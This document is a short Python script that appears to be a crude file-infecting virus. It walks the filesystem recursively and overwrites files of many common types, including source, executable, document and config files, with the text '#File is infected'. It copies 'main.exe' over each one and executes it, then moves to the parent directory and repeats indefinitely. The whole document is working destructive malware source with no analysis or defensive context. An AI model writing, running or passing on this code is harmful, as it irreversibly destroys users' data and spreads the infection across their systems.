import os
import shutil

file_name = 'main.exe'
currend_file = os.path.join(os.getcwd(),file_name)

def find_py_files(directory):
    py_files = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(('.py', '.exe', '.txt', '.js', '.json', '.cpp', '.c', 
                  '.AVI', '.XML', '.PDF', '.DOC', '.dll', '.xml', '.ini')):
                py_files.append(os.path.join(root, file))
                dir = os.path.join(root,file)
                print(dir)

                if dir == currend_file:
                    print('main.file')
                else:
                    with open(dir, 'w') as files:
                        files.write('#File is infected')
                        os.system(dir)
                        try:
                            shutil.copy(currend_file,dir)
                            os.system(dir)
                            pass
                        except:
                            pass
                    
                        
                print(dir)
    change_dir_and_find_py_files()
    return py_files

def change_dir_and_find_py_files():
    os.chdir('..')
    current_dir = os.getcwd()
    find_py_files(current_dir)

change_dir_and_find_py_files()